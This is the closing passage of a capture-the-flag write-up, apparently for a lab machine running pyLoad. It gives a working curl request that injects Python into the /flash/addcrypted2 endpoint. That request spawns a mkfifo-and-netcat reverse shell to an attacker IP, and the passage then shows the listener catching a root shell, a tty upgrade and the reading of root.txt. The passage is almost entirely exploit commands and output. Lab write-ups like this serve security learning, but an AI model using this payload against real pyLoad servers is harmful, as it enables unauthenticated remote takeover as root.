┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.6%206666%20%3E%2Ftmp%2Ff\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://localhost:8000/flash/addcrypted2'



//And finally in NC we have a shell baby!
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# nc -lvnp 6666        
listening on [any] 6666 ...


connect to [10.10.14.6] from (UNKNOWN) [10.10.11.214] 39070
/bin/sh: 0: can't access tty; job control turned off
# # #
```

And lastly grab last flag:

```Bash
# # # whoami
root
# 
# pwd
/root/.pyload/data
# ll 
/bin/sh: 6: ll: not found
# ls -al
total 44
drwxr-xr-x 2 root root  4096 May 20 19:00 .
drwxr-xr-x 7 root root  4096 Jan 11 17:21 ..
-rw-r--r-- 1 root root     1 Jan 11 17:21 db.version
-rw------- 1 root root 28672 May 20 19:00 pyload.db
# cd ..
# ls
data
logs
plugins
scripts
settings
# cd ..
# ls
Downloads
root.txt
snap
sqlite.db.bak
# script /dev/null -c bash
Script started, file is /dev/null
root@pc:~# cat roo	
cat root.txt
```

* * *